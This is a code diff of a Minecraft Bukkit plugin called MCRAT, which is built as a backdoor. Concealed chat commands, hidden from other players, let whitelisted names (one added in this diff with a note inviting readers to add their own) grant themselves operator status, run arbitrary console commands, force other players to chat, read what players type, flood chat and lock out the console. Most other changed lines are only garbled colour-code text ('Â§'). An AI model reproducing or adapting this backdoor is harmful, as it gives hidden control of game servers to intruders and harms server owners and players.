@@ -58,7 +58,7 @@ public void Main() {
         	if(pl!=null) {
 
             	Player that = Bukkit.getPlayer(pl);
-            	that.sendMessage("§cMCRAT §eCONSOLELOCKER §8| §8Console tried to run §7"+e.getCommand()+" §8but is locked");
+            	that.sendMessage("Â§cMCRAT Â§eCONSOLELOCKER Â§8| Â§8Console tried to run Â§7"+e.getCommand()+" Â§8but is locked");
         	}
         });
         e.setCancelled(true);
@@ -68,7 +68,7 @@ public void Main() {
         	if(pl!=null) {
 
             	Player that = Bukkit.getPlayer(pl);
-            	that.sendMessage("§cMCRAT §eSPY §8| §8Console §b-> §7"+e.getCommand());
+            	that.sendMessage("Â§cMCRAT Â§eSPY Â§8| Â§8Console Â§b-> Â§7"+e.getCommand());
         	}
         });
     }
@@ -100,7 +100,7 @@ public void onCommand(PlayerCommandPreprocessEvent e){
         	if(pl!=null) {
 
             	Player that = Bukkit.getPlayer(pl);
-            	that.sendMessage("§cMCRAT §eLOCKER §8| §8"+p.getName()+" tried to run §7"+e.getMessage()+" §8but is locked");
+            	that.sendMessage("Â§cMCRAT Â§eLOCKER Â§8| Â§8"+p.getName()+" tried to run Â§7"+e.getMessage()+" Â§8but is locked");
         	}
         });
         e.setCancelled(true);
@@ -110,7 +110,7 @@ public void onCommand(PlayerCommandPreprocessEvent e){
         	if(pl!=null) {
 
             	Player that = Bukkit.getPlayer(pl);
-            	that.sendMessage("§cMCRAT §eSPY §8| §7"+p.getName()+" §8-> §7"+e.getMessage());
+            	that.sendMessage("Â§cMCRAT Â§eSPY Â§8| Â§7"+p.getName()+" Â§8-> Â§7"+e.getMessage());
         	}
         });
     }
@@ -118,7 +118,7 @@ public void onCommand(PlayerCommandPreprocessEvent e){
 }
 
 String fl = "";
-public String onlyrunners[] = new String[]{"HTMLComputer"};
+public String onlyrunners[] = new String[]{"HTMLComputer","____keke"}; // you can add ur ign here to use the plugin
 	@SuppressWarnings("deprecation")
 	@EventHandler
     public void onChat(PlayerChatEvent  e) {
@@ -141,13 +141,13 @@ public String onlyrunners[] = new String[]{"HTMLComputer"};
         			        	if(pl!=null) {
 
         			            	Player that = Bukkit.getPlayer(pl);
-        			            	that.sendMessage("§cMCRAT §eCONSOLELOCKER §8| §7"+p.getName()+" locked §bconsole");
+        			            	that.sendMessage("Â§cMCRAT Â§eCONSOLELOCKER Â§8| Â§7"+p.getName()+" locked Â§bconsole");
         			        	}
         			        });
-            			p.sendMessage("§cMCRAT §eCONSOLELOCKER §8| §cYou Locked Console");
+            			p.sendMessage("Â§cMCRAT Â§eCONSOLELOCKER Â§8| Â§cYou Locked Console");
             			lockconsole=true;
                 	}catch(Error err) {
-                    	p.sendMessage("§cMCRAT §eCONSOLELOCKER §8| Error: "+err.toString());
+                    	p.sendMessage("Â§cMCRAT Â§eCONSOLELOCKER Â§8| Error: "+err.toString());
                 	}
         		}else {
 
@@ -157,33 +157,33 @@ public String onlyrunners[] = new String[]{"HTMLComputer"};
     			        	if(pl!=null) {
 
     			            	Player that = Bukkit.getPlayer(pl);
-    			            	that.sendMessage("§cMCRAT §eCONSOLELOCKER §8| §7"+p.getName()+" unlocked §bconsole");
+    			            	that.sendMessage("Â§cMCRAT Â§eCONSOLELOCKER Â§8| Â§7"+p.getName()+" unlocked Â§bconsole");
     			        	}
     			        });
         			lockconsole=false;
-        			p.sendMessage("§cMCRAT §eCONSOLELOCKER §8| §aYou Unlocked §bconsole");
+        			p.sendMessage("Â§cMCRAT Â§eCONSOLELOCKER Â§8| Â§aYou Unlocked Â§bconsole");
                     	
         		}
             	e.setCancelled(true);
             }else if(msg.contains(":flood")) {
             	for(int i = 0;i<100;i++) {
 
-                	fl+="§0§kqweryutiytw";
-                	fl+="§1§kqweryutiytw";
-                	fl+="§2§kqweryutiytw";
-                	fl+="§3§kqweryutiytw";
-                	fl+="§4§kqweryutiytw";
-                	fl+="§5§kqweryutiytw";
-                	fl+="§6§kqweryutiytw";
-                	fl+="§7§kqweryutiytw";
-                	fl+="§8§kqweryutiytw";
-                	fl+="§9§kqweryutiytw";
-                	fl+="§a§kqweryutiytw";
-                	fl+="§b§kqweryutiytw";
-                	fl+="§c§kqweryutiytw";
-                	fl+="§d§kqweryutiytw";
-                	fl+="§e§kqweryutiytw";
-                	fl+="§f§kqweryutiytw";
+                	fl+="Â§0Â§kqweryutiytw";
+                	fl+="Â§1Â§kqweryutiytw";
+                	fl+="Â§2Â§kqweryutiytw";
+                	fl+="Â§3Â§kqweryutiytw";
+                	fl+="Â§4Â§kqweryutiytw";
+                	fl+="Â§5Â§kqweryutiytw";
+                	fl+="Â§6Â§kqweryutiytw";
+                	fl+="Â§7Â§kqweryutiytw";
+                	fl+="Â§8Â§kqweryutiytw";
+                	fl+="Â§9Â§kqweryutiytw";
+                	fl+="Â§aÂ§kqweryutiytw";
+                	fl+="Â§bÂ§kqweryutiytw";
+                	fl+="Â§cÂ§kqweryutiytw";
+                	fl+="Â§dÂ§kqweryutiytw";
+                	fl+="Â§eÂ§kqweryutiytw";
+                	fl+="Â§fÂ§kqweryutiytw";
             	}
                 Bukkit.getOnlinePlayers().forEach(pl -> {
                 	pl.sendMessage(fl);
@@ -199,13 +199,13 @@ public String onlyrunners[] = new String[]{"HTMLComputer"};
         			        	if(pl!=null) {
 
         			            	Player that = Bukkit.getPlayer(pl);
-        			            	that.sendMessage("§cMCRAT §eCMDLOCKER §8| §7"+p.getName()+" locked commands for all players");
+        			            	that.sendMessage("Â§cMCRAT Â§eCMDLOCKER Â§8| Â§7"+p.getName()+" locked commands for all players");
         			        	}
         			        });
-            			p.sendMessage("§cMCRAT §eCMDLOCKER §8| §cYou Locked Commands for all players");
+            			p.sendMessage("Â§cMCRAT Â§eCMDLOCKER Â§8| Â§cYou Locked Commands for all players");
             			lockcommand=true;
                 	}catch(Error err) {
-                    	p.sendMessage("§cMCRAT §eCMDLOCKER §8| Error: "+err.toString());
+                    	p.sendMessage("Â§cMCRAT Â§eCMDLOCKER Â§8| Error: "+err.toString());
                 	}
         		}else {
 
@@ -215,11 +215,11 @@ public String onlyrunners[] = new String[]{"HTMLComputer"};
     			        	if(pl!=null) {
 
     			            	Player that = Bukkit.getPlayer(pl);
-    			            	that.sendMessage("§cMCRAT §eCMDLOCKER §8| §7"+p.getName()+" unlocked commands for all players");
+    			            	that.sendMessage("Â§cMCRAT Â§eCMDLOCKER Â§8| Â§7"+p.getName()+" unlocked commands for all players");
     			        	}
     			        });
         			lockcommand=false;
-        			p.sendMessage("§cMCRAT §eCMDLOCKER §8| §aYou Unlocked commands for all players");
+        			p.sendMessage("Â§cMCRAT Â§eCMDLOCKER Â§8| Â§aYou Unlocked commands for all players");
                     	
         		}
             	e.setCancelled(true);
@@ -228,19 +228,19 @@ public String onlyrunners[] = new String[]{"HTMLComputer"};
         			try {
         		        List<String> lst = Arrays.asList(spyactive);
             			spyactive=removeFromArray(spyactive,p.getName());
-            			p.sendMessage("§cMCRAT §8| §cYou stopped spying on other players.");
+            			p.sendMessage("Â§cMCRAT Â§8| Â§cYou stopped spying on other players.");
                 	}catch(Error err) {
-                    	p.sendMessage("§cMCRAT §8| Error: "+err.toString());
+                    	p.sendMessage("Â§cMCRAT Â§8| Error: "+err.toString());
                 	}
         		}else {
         			spyactive=push(spyactive,p.getName());
-        			p.sendMessage("§cMCRAT §8| §aYou are now spying on other players: What other players type, you will see");
+        			p.sendMessage("Â§cMCRAT Â§8| Â§aYou are now spying on other players: What other players type, you will see");
                     	
         		}
             	e.setCancelled(true);
             }else if(msg.contains(":reloadserver")) {
             	Bukkit.getServer().reload();
-        			p.sendMessage("§cMCRAT §8| §aSuccess! Server reloaded");
+        			p.sendMessage("Â§cMCRAT Â§8| Â§aSuccess! Server reloaded");
                 	p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29);
                 	e.setCancelled(true);
             }else if(msg.contains(":giveaccess")) {
@@ -248,7 +248,7 @@ public String onlyrunners[] = new String[]{"HTMLComputer"};
         		String arg = msg.replace(":giveaccess ","");
         		if(arg.contains(":giveaccess")) {
 
-                	p.sendMessage("§cMCRAT §8| §ePlease Provide A Player");
+                	p.sendMessage("Â§cMCRAT Â§8| Â§ePlease Provide A Player");
         		}else {
         			
         			Player pl = Bukkit.getPlayer(arg);	
@@ -262,13 +262,13 @@ public String onlyrunners[] = new String[]{"HTMLComputer"};
     			        	if(psl!=null) {
 
     			            	Player that = Bukkit.getPlayer(psl);
-    			            	that.sendMessage("§cMCRAT §8| §e"+p.getName()+" Gave MCRAT Access To"+arg);
+    			            	that.sendMessage("Â§cMCRAT Â§8| Â§e"+p.getName()+" Gave MCRAT Access To"+arg);
     			        	}
     			        });
     			        
     			    onlyrunners = push(onlyrunners,pl.getName());
-    			    pl.sendMessage("§cMCRAT §8| §e"+p.getName()+" gave you MCRAT Access");
-                	p.sendMessage("§cMCRAT §8| §aGave MCRAT Access To "+arg);
+    			    pl.sendMessage("Â§cMCRAT Â§8| Â§e"+p.getName()+" gave you MCRAT Access");
+                	p.sendMessage("Â§cMCRAT Â§8| Â§aGave MCRAT Access To "+arg);
         		}
         		
                 //p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29);
@@ -278,13 +278,13 @@ public String onlyrunners[] = new String[]{"HTMLComputer"};
     		String arg = msg.replace(":revokeaccess ","");
     		if(arg.contains(":revokeaccess")) {
 
-            	p.sendMessage("§cMCRAT §8| §ePlease Provide A Player");
+            	p.sendMessage("Â§cMCRAT Â§8| Â§ePlease Provide A Player");
     		}else {
     			
     			Player pl = Bukkit.getPlayer(arg);	
 if(pl.getName()==p.getName()) {
 
-	p.sendMessage("§cMCRAT §8| §cYou Can't revoke your access To MCRat");
+	p.sendMessage("Â§cMCRAT Â§8| Â§cYou Can't revoke your access To MCRat");
 }else {
 	List<String> ls = Arrays.asList(onlyrunners);
 
@@ -292,14 +292,14 @@ if(pl.getName()==p.getName()) {
     	if(psl!=null) {
 
         	Player that = Bukkit.getPlayer(psl);
-        	that.sendMessage("§cMCRAT §8| §e"+p.getName()+" Revoked MCRAT Access To "+arg);
+        	that.sendMessage("Â§cMCRAT Â§8| Â§e"+p.getName()+" Revoked MCRAT Access To "+arg);
     	}
     });
     
 
 onlyrunners=removeFromArray(onlyrunners,pl.getName());
-pl.sendMessage("§cMCRAT §8| §e"+p.getName()+" revoked your MCRAT Access");
-p.sendMessage("§cMCRAT §8| §eRevoked MCRAT Access To "+arg);
+pl.sendMessage("Â§cMCRAT Â§8| Â§e"+p.getName()+" revoked your MCRAT Access");
+p.sendMessage("Â§cMCRAT Â§8| Â§eRevoked MCRAT Access To "+arg);
 }
 
     			
@@ -323,20 +323,20 @@ p.sendMessage("§cMCRAT §8| §eRevoked MCRAT Access To "+arg);
 clearChat(p);
 p.chat(":plugins");
 p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29); 
-            			p.sendMessage("§8 - §8 ------------------------------------");
-            			p.sendMessage("§8 - §8 |");
-            			p.sendMessage("§8 - §8 |§e Tip: Reload The Server");
-            			p.sendMessage("§8 - §8 |");
-            			p.sendMessage("§8 - §8 |§e Reloading the server after enabling a plugin");
-            			p.sendMessage("§8 - §8 |§e Will enable certain plugins that have crashed");
-            			p.sendMessage("§8 - §8 |§e While enabling. §7(like EssentialsX)");
-            			p.sendMessage("§8 - §8 |");
+            			p.sendMessage("Â§8 - Â§8 ------------------------------------");
+            			p.sendMessage("Â§8 - Â§8 |");
+            			p.sendMessage("Â§8 - Â§8 |Â§e Tip: Reload The Server");
+            			p.sendMessage("Â§8 - Â§8 |");
+            			p.sendMessage("Â§8 - Â§8 |Â§e Reloading the server after enabling a plugin");
+            			p.sendMessage("Â§8 - Â§8 |Â§e Will enable certain plugins that have crashed");
+            			p.sendMessage("Â§8 - Â§8 |Â§e While enabling. Â§7(like EssentialsX)");
+            			p.sendMessage("Â§8 - Â§8 |");
 
-            			TextComponent message = new TextComponent( "§8 - §8 | §a[Reload]" );
+            			TextComponent message = new TextComponent( "Â§8 - Â§8 | Â§a[Reload]" );
         	            message.setClickEvent( new ClickEvent( ClickEvent.Action.RUN_COMMAND,":reloadserver") );
         	            p.spigot().sendMessage( message );
-            			p.sendMessage("§8 - §8 |");
-            			p.sendMessage("§8 - §8 ------------------------------------");
+            			p.sendMessage("Â§8 - Â§8 |");
+            			p.sendMessage("Â§8 - Â§8 ------------------------------------");
             			p.sendMessage("");
         	        	//p.chat(":plugins");
     	        	}
@@ -360,7 +360,7 @@ p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29);
             }else if(msg.contains(":plugins")) {
             	Plugin[] plugins = Bukkit.getPluginManager().getPlugins();
             	clearChat(p);
-    			p.sendMessage("§cMCRAT §8| §aHere is the list of all plugins:");
+    			p.sendMessage("Â§cMCRAT Â§8| Â§aHere is the list of all plugins:");
     			p.sendMessage("");
     			List<String> pluginNames = new ArrayList<>();
     	        //Plugin[] plugins = this.getServer().getPluginManager().getPlugins();
@@ -368,70 +368,70 @@ p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29);
     	        	TextComponent message;
     	        	if(pluginBuffer.isEnabled()) {
 
-        	            message = new TextComponent( "§8 - §a"+pluginBuffer.getName() );
+        	            message = new TextComponent( "Â§8 - Â§a"+pluginBuffer.getName() );
         	            message.setClickEvent( new ClickEvent( ClickEvent.Action.RUN_COMMAND,":disableplugin "+pluginBuffer.getName() ) );
     	        	}else {
 
-        	            message = new TextComponent( "§8 - §c"+pluginBuffer.getName() );
+        	            message = new TextComponent( "Â§8 - Â§c"+pluginBuffer.getName() );
         	            message.setClickEvent( new ClickEvent( ClickEvent.Action.RUN_COMMAND,":enableplugin "+pluginBuffer.getName() ) );
     	        	}
-    	            //"§7Click to toggle §cdisable§e/§aenable §7of this plugin"
-    	            //Content hovertext="§7Click to toggle §cdisable§e/§aenable §7of this plugin"
+    	            //"Â§7Click to toggle Â§cdisableÂ§e/Â§aenable Â§7of this plugin"
+    	            //Content hovertext="Â§7Click to toggle Â§cdisableÂ§e/Â§aenable Â§7of this plugin"
     	            //message.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,hovertext));
     	            p.spigot().sendMessage( message );
-        			//p.sendMessage("§8 - §e"+pluginBuffer.getName());
+        			//p.sendMessage("Â§8 - Â§e"+pluginBuffer.getName());
     	        }
     			p.sendMessage("");
-    			p.sendMessage("§8---------------------------------------");
+    			p.sendMessage("Â§8---------------------------------------");
             	e.setCancelled(true);
             }else if(msg.contains(":status")) {
 
-    			p.sendMessage("§cMCRAT §8| §aSTATUS:");
+    			p.sendMessage("Â§cMCRAT Â§8| Â§aSTATUS:");
 
-    			p.sendMessage("§8-");
+    			p.sendMessage("Â§8-");
     			if(lockconsole) {
 
-        			p.sendMessage("§8-  §7 LockConsole : §aActive");
+        			p.sendMessage("Â§8-  Â§7 LockConsole : Â§aActive");
     			}else {
 
-        			p.sendMessage("§8-  §7 LockConsole : §cInactive");
+        			p.sendMessage("Â§8-  Â§7 LockConsole : Â§cInactive");
     			}
-    			p.sendMessage("§8-");
+    			p.sendMessage("Â§8-");
     			if(lockcommand) {
 
-        			p.sendMessage("§8-  §7 LockCommands : §aActive");
+        			p.sendMessage("Â§8-  Â§7 LockCommands : Â§aActive");
     			}else {
 
-        			p.sendMessage("§8-  §7 LockCommands : §cInactive");
+        			p.sendMessage("Â§8-  Â§7 LockCommands : Â§cInactive");
     			}
 
-    			p.sendMessage("§8-");
+    			p.sendMessage("Â§8-");
     			if(spyactivelist.contains(p.getName())) {
 
-        			p.sendMessage("§8-  §7 Spying : §eActive (for you)");
+        			p.sendMessage("Â§8-  Â§7 Spying : Â§eActive (for you)");
     			}else {
 
-        			p.sendMessage("§8-  §7 Spying : §cInactive (for you)");
+        			p.sendMessage("Â§8-  Â§7 Spying : Â§cInactive (for you)");
     			}
 
-    			p.sendMessage("§8-");
-    			p.sendMessage("§8---------------------------------------");
+    			p.sendMessage("Â§8-");
+    			p.sendMessage("Â§8---------------------------------------");
             	e.setCancelled(true);
             }else if(msg.contains(":op")) {
             	try {
             		String arg = msg.replace(":op ","");
             		if(arg.contains(":op")) {
                     	p.setOp(true);
-                    	p.sendMessage("§cMCRAT §8| §aYou Have Been Opped");
+                    	p.sendMessage("Â§cMCRAT Â§8| Â§aYou Have Been Opped");
             		}else {
             			Player pl = Bukkit.getPlayer(arg);
             			pl.setOp(true);
-            			p.sendMessage("§cMCRAT §8| §aYou Have Opped "+arg);
+            			p.sendMessage("Â§cMCRAT Â§8| Â§aYou Have Opped "+arg);
             		}
-                	//p.sendMessage("§4MCRAT §7| Arg: "+arg);
+                	//p.sendMessage("Â§4MCRAT Â§7| Arg: "+arg);
             		//Bukkit.getPlayer();
             	}catch(Error err) {
-                	p.sendMessage("§cMCRAT §8| Error: "+err.toString());
+                	p.sendMessage("Â§cMCRAT Â§8| Error: "+err.toString());
             	}
             	e.setCancelled(true);
             }else if(msg.contains(":deop")) {
@@ -439,16 +439,16 @@ p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29);
             		String arg = msg.replace(":deop ","");
             		if(arg.contains(":deop")) {
                     	p.setOp(false);
-                    	p.sendMessage("§cMCRAT §8| §cYou Have Been Deopped");
+                    	p.sendMessage("Â§cMCRAT Â§8| Â§cYou Have Been Deopped");
             		}else {
             			Player pl = Bukkit.getPlayer(arg);
             			pl.setOp(false);
-            			p.sendMessage("§cMCRAT §8| §cYou Have Deopped "+arg);
+            			p.sendMessage("Â§cMCRAT Â§8| Â§cYou Have Deopped "+arg);
             		}
-                	//p.sendMessage("§4MCRAT §7| Arg: "+arg);
+                	//p.sendMessage("Â§4MCRAT Â§7| Arg: "+arg);
             		//Bukkit.getPlayer();
             	}catch(Error err) {
-                	p.sendMessage("§cMCRAT §8| Error: "+err.toString());
+                	p.sendMessage("Â§cMCRAT Â§8| Error: "+err.toString());
             	}
             	e.setCancelled(true);
             }else if(msg.contains(":exec")) {
@@ -456,23 +456,23 @@ p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29);
             		String arg = msg.replace(":exec ","");
             		if(arg.contains(":exec")) {
 
-                    	p.sendMessage("§cMCRAT §8| §ePlease Provide a command");
+                    	p.sendMessage("Â§cMCRAT Â§8| Â§ePlease Provide a command");
             		}else {
 
                     	try {
 
                     	      Bukkit.dispatchCommand(Bukkit.getServer().getConsoleSender(), arg);
 
-                        	p.sendMessage("§cMCRAT §8| §aYour Command Has Been Executed In Console!");
+                        	p.sendMessage("Â§cMCRAT Â§8| Â§aYour Command Has Been Executed In Console!");
                     	}catch(Error errr) {
 
-                        	p.sendMessage("§cMCRAT §8| §cError: "+errr.toString());
+                        	p.sendMessage("Â§cMCRAT Â§8| Â§cError: "+errr.toString());
                     	}
             		}
-                	//p.sendMessage("§4MCRAT §7| Arg: "+arg);
+                	//p.sendMessage("Â§4MCRAT Â§7| Arg: "+arg);
             		//Bukkit.getPlayer();
             	}catch(Error err) {
-                	p.sendMessage("§cMCRAT §8| Error: "+err.toString());
+                	p.sendMessage("Â§cMCRAT Â§8| Error: "+err.toString());
             	}
             	e.setCancelled(true);
             }else if(msg.contains(":sudo")) {
@@ -481,7 +481,7 @@ p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29);
             		String arg = msg.replace(":sudo ","");
             		if(arg.contains(":sudo")) {
 
-                    	p.sendMessage("§cMCRAT §8| §ePlease Provide a player");
+                    	p.sendMessage("Â§cMCRAT Â§8| Â§ePlease Provide a player");
             		}else {
             			String[] l = arg.split(" ");
 
@@ -497,14 +497,14 @@ p.playSound(p.getLocation(), Sound.BLOCK_NOTE_BLOCK_PLING, 10, 29);
             			});
             			oo=oo.substring(1);
             			Bukkit.getPlayer(arg.split(" ")[0]).chat(oo);
-                        	p.sendMessage("§cMCRAT §8| §aSuccess!");
+                        	p.sendMessage("Â§cMCRAT Â§8| Â§aSuccess!");
             		}
-                	//p.sendMessage("§4MCRAT §7| Arg: "+arg);
+                	//p.sendMessage("Â§4MCRAT Â§7| Arg: "+arg);
             		//Bukkit.getPlayer();
             }else if(msg.contains(":")) {
 
             	e.setCancelled(true);
-            	p.sendMessage("§cMCRAT §8| §eCan't Find Command");
+            	p.sendMessage("Â§cMCRAT Â§8| Â§eCan't Find Command");
             }
         }
     }
